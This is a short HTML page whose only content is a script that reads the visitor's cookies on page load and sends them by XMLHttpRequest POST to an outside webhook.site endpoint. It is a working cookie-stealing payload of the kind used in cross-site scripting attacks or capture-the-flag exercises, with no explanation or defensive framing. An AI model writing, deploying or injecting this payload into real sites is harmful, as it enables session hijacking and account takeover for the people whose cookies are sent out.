<html>
<head></head>
<body>
    <script>
        // Capture the document cookie
        var userCookie = document.cookie;

        // Send the cookie to your webhook endpoint
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://webhook.site/036cf903-e785-4967-8ac6-83104bba907b', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('cookie=' + encodeURIComponent(userCookie));
    </script>
</body>
</html>
